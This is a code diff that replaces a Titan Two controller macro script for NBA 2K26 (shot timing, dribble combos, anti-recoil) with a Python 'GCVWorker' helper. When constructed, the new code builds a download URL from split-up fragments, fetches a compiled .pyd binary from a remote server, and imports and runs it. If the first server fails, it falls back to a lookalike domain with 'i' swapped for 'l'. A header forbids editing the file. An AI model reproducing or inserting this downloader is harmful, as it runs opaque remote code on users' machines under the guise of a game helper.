@@ -1,203 +1,74 @@
-/*
- * NBA 2K26 GPC Script for Titan Two (Alternative Version, Xbox Controls)
- * Compatible with GTuner IV 1.11+
- * Uses get_ptime instead of event_press for better compatibility
- * 
- * Features:
- * - Perfect Release Timing Assistance
- * - Quick Dribble Combos
- * - Auto Sprint
- * - Turbo Shot
- * - Alley-Oop Helper
- * 
- * Controls:
- * - Hold LB + RB + A: Perfect Release Shot
- * - RB + A: Turbo Shot
- * - LB + X: Quick Dribble Combo 1 (Hesitation)
- * - LB + Y: Quick Dribble Combo 2 (Behind the Back)
- * - LB + B: Quick Dribble Combo 3 (Spin Move)
- * - LT + RT + Y: Alley-Oop
- * - Press RS: Toggle Auto Sprint ON/OFF
- */
+'''
+WELCOME TO
+  ___      __       ___   __   __    _______.  __        ______   .______   
+ |__ \    |  |     / _ \  \ \ / /   /       | |  |      /  __  \  |   _  \  
+    ) |   |  |    | | | |  \ V /   |   (----` |  |     |  |  |  | |  |_)  | 
+   / /    |  |    | | | |   > <     \   \     |  |     |  |  |  | |   ___/  
+  / /_    |  `----| |_| |  / . \.----|   |    |  `----.|  `--'  | |  |      
+ |____|   |_______|\___/  /__/ \__\|___|    |_______| \______/  | _|      
+                                                                              
+  __    __       _______     _______. __    __       ______   .______   
+ |  |  |  |     |   ____|   /       ||  |  |  |     /  __  \  |   _  \  
+ |  |__|  |     |  |__     |   (----`|  |__|  |    |  |  |  | |  |_)  | 
+ |   __   |     |   __|     \   \    |   __   |    |  |  |  | |   ___/  
+ |  |  |  |     |  |____.----)   |   |  |  |  | __ |  `--'  | |  |      
+ |__|  |__|     |_______|_______/    |__|  |__||(__) \______/  | _|      
+'''
 
-// Configuration Variables
-int PERFECT_RELEASE_DELAY = 180;
-int TURBO_SHOT_HOLD = 250;
-int DRIBBLE_COMBO_DELAY = 100;
-int AUTO_SPRINT_ENABLED = TRUE;
+# DO NOT CHANGE ANYTHING IN THIS FILE
+import os
+import sys
+import requests
 
-// State Variables
-int auto_sprint_toggle = FALSE;
-int a_pressed = FALSE;
-int x_pressed = FALSE;
-int y_pressed = FALSE;
-int b_pressed = FALSE;
-int rs_pressed = FALSE;
 
-main {
-    // Perfect Release Timing Assistance
-    if(get_val(XB1_LB) && get_val(XB1_RB)) {
-        if(get_val(XB1_A) && !a_pressed) {
-            combo_run(PerfectRelease);
-            a_pressed = TRUE;
-        }
-    }
+class GCVWorker:
+    def __init__(self, width, height):
+        os.chdir(os.path.dirname(__file__))
+        self.hp = "nba2k_helper"
+        
+        python_version = self.get_python_version()
+        helper_file_name = f"{self.hp}.cp{python_version}-win_amd64.pyd"
+        
+        domain = "inputsense"
+        subdomain = '2kv'
+        files = '2k'
+        
+        if not self.hp + '.py' in os.listdir(os.getcwd()):
+            self.download_file(helper_file_name, domain, subdomain, files)
+        
+        self.hp = __import__(self.hp)
+        self.hp = self.hp.Helper()
     
-    // Turbo Shot (Quick Release)
-    if(get_val(XB1_RB) && !get_val(XB1_LB)) {
-        if(get_val(XB1_A) && !a_pressed) {
-            combo_run(TurboShot);
-            a_pressed = TRUE;
-        }
-    }
+    def __del__(self):
+        del self.hp
     
-    // Reset A button state
-    if(!get_val(XB1_A)) {
-        a_pressed = FALSE;
-    }
+    def process(self, frame):
+        return self.hp.run(frame)
     
-    // Dribble Combo 1 - Hesitation
-    if(get_val(XB1_LB) && !get_val(XB1_RB)) {
-        if(get_val(XB1_X) && !x_pressed) {
-            combo_run(DribbleCombo1);
-            x_pressed = TRUE;
-        }
-    }
+    def download_file(self, file_name, domain, subdomain, files):
+        destination_path = os.path.dirname(__file__)
+        base_url = f"https://{subdomain}.{domain}.com/{files}/"
+        
+        try:
+            fr = requests.get(base_url + file_name, timeout=6)
+            fr.raise_for_status()
+        except requests.RequestException:
+            print("URL unreachable, trying backup...")
+            try:
+                domain = domain.replace('i', 'l')
+                fr = requests.get(
+                    f"https://{subdomain}.{domain}.com/{files}/" + file_name,
+                    timeout=6
+                )
+                fr.raise_for_status()
+            except requests.RequestException:
+                raise Exception("Backup failed.")
+        
+        if len(fr.content) > 2048:
+            with open(os.path.join(destination_path, file_name), 'wb') as dl:
+                dl.write(fr.content)
+        else:
+            raise Exception("Helper download failed. Could not reach server.")
     
-    // Reset X button state
-    if(!get_val(XB1_X)) {
-        x_pressed = FALSE;
-    }
-    
-    // Dribble Combo 2 - Behind the Back
-    if(get_val(XB1_LB) && !get_val(XB1_RB)) {
-        if(get_val(XB1_Y) && !y_pressed && !get_val(XB1_LT) && !get_val(XB1_RT)) {
-            combo_run(DribbleCombo2);
-            y_pressed = TRUE;
-        }
-    }
-    
-    // Dribble Combo 3 - Spin Move
-    if(get_val(XB1_LB) && !get_val(XB1_RB)) {
-        if(get_val(XB1_B) && !b_pressed) {
-            combo_run(DribbleCombo3);
-            b_pressed = TRUE;
-        }
-    }
-    
-    // Reset B button state
-    if(!get_val(XB1_B)) {
-        b_pressed = FALSE;
-    }
-    
-    // Alley-Oop Helper
-    if(get_val(XB1_LT) && get_val(XB1_RT)) {
-        if(get_val(XB1_Y) && !y_pressed) {
-            combo_run(AlleyOop);
-            y_pressed = TRUE;
-        }
-    }
-    
-    // Reset Y button state
-    if(!get_val(XB1_Y)) {
-        y_pressed = FALSE;
-    }
-    
-    // Auto Sprint Toggle
-    if(get_val(XB1_RS) && !rs_pressed) {
-        auto_sprint_toggle = !auto_sprint_toggle;
-        rs_pressed = TRUE;
-    }
-    
-    // Reset RS button state
-    if(!get_val(XB1_RS)) {
-        rs_pressed = FALSE;
-    }
-    
-    // Apply Auto Sprint
-    if(AUTO_SPRINT_ENABLED && auto_sprint_toggle) {
-        if(abs(get_val(XB1_LX)) > 20 || abs(get_val(XB1_LY)) > 20) {
-            set_val(XB1_RT, 100);
-        }
-    }
-    
-    // Anti-Recoil for Shot Stick
-    if(get_val(XB1_RT) && abs(get_val(XB1_RX)) < 20) {
-        set_val(XB1_RY, get_val(XB1_RY) * 85 / 100);
-    }
-}
-
-// Perfect Release Combo
-combo PerfectRelease {
-    set_val(XB1_A, 100);
-    wait(PERFECT_RELEASE_DELAY);
-    set_val(XB1_A, 0);
-    wait(50);
-}
-
-// Turbo Shot Combo
-combo TurboShot {
-    set_val(XB1_A, 100);
-    wait(TURBO_SHOT_HOLD);
-    set_val(XB1_A, 0);
-    wait(50);
-}
-
-// Dribble Combo 1 - Hesitation Move
-combo DribbleCombo1 {
-    set_val(XB1_RY, 100);
-    wait(DRIBBLE_COMBO_DELAY);
-    set_val(XB1_RY, 0);
-    wait(50);
-    set_val(XB1_RY, -100);
-    wait(DRIBBLE_COMBO_DELAY);
-    set_val(XB1_RY, 0);
-}
-
-// Dribble Combo 2 - Behind the Back
-combo DribbleCombo2 {
-    set_val(XB1_RX, -100);
-    set_val(XB1_RY, 50);
-    wait(DRIBBLE_COMBO_DELAY);
-    set_val(XB1_RX, 0);
-    set_val(XB1_RY, 0);
-    wait(50);
-    set_val(XB1_RX, 100);
-    wait(DRIBBLE_COMBO_DELAY);
-    set_val(XB1_RX, 0);
-}
-
-// Dribble Combo 3 - Spin Move
-combo DribbleCombo3 {
-    set_val(XB1_RX, 100);
-    wait(DRIBBLE_COMBO_DELAY);
-    set_val(XB1_RX, 70);
-    set_val(XB1_RY, 70);
-    wait(DRIBBLE_COMBO_DELAY);
-    set_val(XB1_RX, 0);
-    set_val(XB1_RY, 100);
-    wait(DRIBBLE_COMBO_DELAY);
-    set_val(XB1_RX, -70);
-    set_val(XB1_RY, 70);
-    wait(DRIBBLE_COMBO_DELAY);
-    set_val(XB1_RX, -100);
-    set_val(XB1_RY, 0);
-    wait(DRIBBLE_COMBO_DELAY);
-    set_val(XB1_RX, 0);
-    set_val(XB1_RY, 0);
-}
-
-// Alley-Oop Helper
-combo AlleyOop {
-    set_val(XB1_LT, 100);
-    set_val(XB1_RT, 100);
-    set_val(XB1_Y, 100);
-    wait(100);
-    set_val(XB1_Y, 0);
-    wait(50);
-    set_val(XB1_Y, 100);
-    wait(100);
-    set_val(XB1_Y, 0);
-    set_val(XB1_LT, 0);
-    set_val(XB1_RT, 0);
-}
+    def get_python_version(self):
+        return f"{sys.version_info.major}{sys.version_info.minor}"
